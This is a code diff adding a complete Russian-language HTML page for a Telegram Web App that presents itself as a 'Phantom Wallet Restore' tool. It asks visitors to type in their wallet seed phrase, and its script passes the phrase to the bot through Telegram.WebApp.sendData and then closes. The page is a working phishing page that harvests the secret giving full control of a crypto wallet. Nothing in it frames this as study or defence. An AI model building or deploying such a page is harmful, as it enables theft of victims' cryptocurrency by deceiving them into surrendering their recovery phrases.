@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Phantom Wallet Restore</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    body { font-family: sans-serif; text-align: center; margin-top: 50px; }
+    textarea { width: 80%; height: 100px; }
+    button { padding: 10px 20px; margin-top: 10px; }
+  </style>
+</head>
+<body>
+  <h2>🔐 Восстановление кошелька</h2>
+  <p>Введите свою сид-фразу ниже:</p>
+  <textarea id="seed" placeholder="abandon abandon abandon ..."></textarea><br>
+  <button onclick="submit()">Отправить</button>
+
+  <script>
+    function submit() {
+      const seed = document.getElementById("seed").value;
+      Telegram.WebApp.sendData(seed);
+      Telegram.WebApp.close();
+    }
+  </script>
+</body>
+</html>
